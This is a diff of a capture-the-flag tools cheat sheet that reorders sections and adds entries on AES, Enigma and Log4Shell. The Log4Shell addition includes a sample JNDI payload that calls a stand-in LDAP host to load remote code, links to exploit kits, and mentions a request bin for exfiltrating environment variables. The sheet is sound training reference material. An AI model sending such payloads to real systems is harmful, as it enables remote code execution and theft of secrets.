@@ -42,32 +42,6 @@ This file is auto generated using [build.py](build.py). To update it, update the
 
 
 
-## Website Scanning
-
-
-See [Web Enumeration](#web)
-
-
-## Network Scanning
-
-* [`nmap`](https://nmap.org/)
-
-    `nmap` is a utility for network discovery.
-
-Classic scan
-```	
-nmap -sC -sV -O 192.168.0.0/24
-```
-
-SYN scan : Only send SYN (faster but no service detection)
-```
-nmap -sS 192.168.0.0/24
-```
-
-* [`traceroute`](https://en.wikipedia.org/wiki/Traceroute)
-
-    See the path packets take to reach a host.
-
 ## File Scanning
 
 * `file`
@@ -91,6 +65,32 @@ nmap -sS 192.168.0.0/24
 
     Scan a file with Yara rules.
 
+
+
+## Network Scanning
+
+* [`nmap`](https://nmap.org/)
+
+    `nmap` is a utility for network discovery.
+
+Classic scan
+```	
+nmap -sC -sV -O 192.168.0.0/24
+```
+
+SYN scan : Only send SYN (faster but no service detection)
+```
+nmap -sS 192.168.0.0/24
+```
+
+* [`traceroute`](https://en.wikipedia.org/wiki/Traceroute)
+
+    See the path packets take to reach a host.
+
+## Website Scanning
+
+
+See [Web Enumeration](#web)
 
 <br><br>
 
@@ -401,25 +401,6 @@ Tools that will help you to exploit a binary:
     [CTF time WU](https://ctftime.org/writeup/7670)<br>
     [DGHack 2022 WU](https://remyoudompheng.github.io/ctf/dghack2022/wanna_more_features.html)
 
-## ELF
-
-
-* [`checksec`](https://docs.pwntools.com/en/stable/commandline.html)
-
-    A command-line tool that will check the security mechanisms of a binary.
-    
-* [`pwntools`](https://docs.pwntools.com/en/stable/about.html)
-
-    A python library that can be used to interact with a binary.
-
-* [`ROPgadget`](https://pypi.org/project/ROPGadget/)
-
-    A command-line tool that can be used to find gadgets in a binary.
-
-* [`ropper`](https://github.com/sashs/Ropper)
-
-    A command-line tool that can be used to find gadgets in a binary.
-
 ## Windows
 
 
@@ -473,6 +454,25 @@ $ x86_64-w64-mingw32-gdb myprogram.exe
 * [AutoIt](https://www.autoitscript.com/site/autoit/)
 
 	Scripting language for Windows.
+
+## ELF
+
+
+* [`checksec`](https://docs.pwntools.com/en/stable/commandline.html)
+
+    A command-line tool that will check the security mechanisms of a binary.
+    
+* [`pwntools`](https://docs.pwntools.com/en/stable/about.html)
+
+    A python library that can be used to interact with a binary.
+
+* [`ROPgadget`](https://pypi.org/project/ROPGadget/)
+
+    A command-line tool that can be used to find gadgets in a binary.
+
+* [`ropper`](https://github.com/sashs/Ropper)
+
+    A command-line tool that can be used to find gadgets in a binary.
 <br><br>
 
 # Classic Exploits
@@ -492,6 +492,16 @@ $ x86_64-w64-mingw32-gdb myprogram.exe
     Unconfigured system can use the default credentials to login. Some can be found here: [DefaultCreds-Cheat-Sheet.csv](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
 
 * Log4Shell
+
+	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://exemple.com:1389/a}` and need to be parsed by Log4j.
+
+	[Simple POC](https://github.com/kozmer/log4j-shell-poc)
+	
+	[JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
+
+	[ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
+
+	[Request Bin](https://requestbin.net/) Usefull for detection and environment variable exfiltration.
 <br><br>
 
 # Reverse Engineering
@@ -636,6 +646,10 @@ ghidra.py <file>
 	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`
 
 
+## Virtualisation
+
+In order to run some system, it is nessesary to use virtualisation.
+
 ## Python
 
 
@@ -728,8 +742,35 @@ sudo apt install foremost
 
 
 
-## Docker
+## Images
 
+
+* `pngcheck`
+
+	Check if a **PNG** file is valid. If it is not, displays the error.
+
+
+* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)
+
+	Correct the CRCs present in a **PNG** file.
+
+
+* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)
+
+	Correct a corrupted PNG file.
+
+	Utility to try and correct a **PNG** file. 
+	Need to press enter to show the file.
+
+* Repair image online tool
+
+    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)
+
+
+
+* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']
+
+	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.
 
 
 ## Memory Dump
@@ -787,37 +828,6 @@ In Linux:
 * [`mount`]
 
     Mount a disk image. I recommand to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
-
-## Images
-
-
-* `pngcheck`
-
-	Check if a **PNG** file is valid. If it is not, displays the error.
-
-
-* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)
-
-	Correct the CRCs present in a **PNG** file.
-
-
-* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)
-
-	Correct a corrupted PNG file.
-
-	Utility to try and correct a **PNG** file. 
-	Need to press enter to show the file.
-
-* Repair image online tool
-
-    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)
-
-
-
-* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']
-
-	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.
-
 <br><br>
 
 # Cryptography
@@ -825,6 +835,14 @@ In Linux:
 * [SageMath](https://www.sagemath.org/)
 
     Powerful mathematics software, very useful for crypto and number theory.
+
+## AES
+
+[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the same key for encryption and decryption.
+
+* AES ECB
+
+	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.
 
 ## RSA
 
@@ -1101,14 +1119,14 @@ Base91:
 
 	Some time ago we needed to recover the original Base64 string from one that is in all lowercase or all uppercase. Caleb wrote a good script to smartly do this: [https://pastebin.com/HprZcHrY](https://pastebin.com/HprZcHrY)
 
+* [Enigma](https://en.wikipedia.org/wiki/Enigma_machine)
 
-## AES
+	Machine used by the Germans during World War II to encrypt messages. Still takes a lot of time to crack today, but some tricks can be used to speed up the process.
 
-[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the same key for encryption and decryption.
+	[404CTF WU](https://remyoudompheng.github.io/ctf/404ctf/enigma.html)
 
-* AES ECB
 
-	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.
+	
 <br><br>
 
 # Steganography
@@ -1253,15 +1271,15 @@ exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
 # PDF Files
 
 
-* `pdfinfo`
+* [`pdfinfo`](https://poppler.freedesktop.org/)
 
 	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.
 
-* `pdfcrack`
+* [`pdfcrack`](https://pdfcrack.sourceforge.net/)
 
 	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.
 
-* `pdfimages`
+* [`pdfimages`](https://poppler.freedesktop.org/)
 
 	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.
 
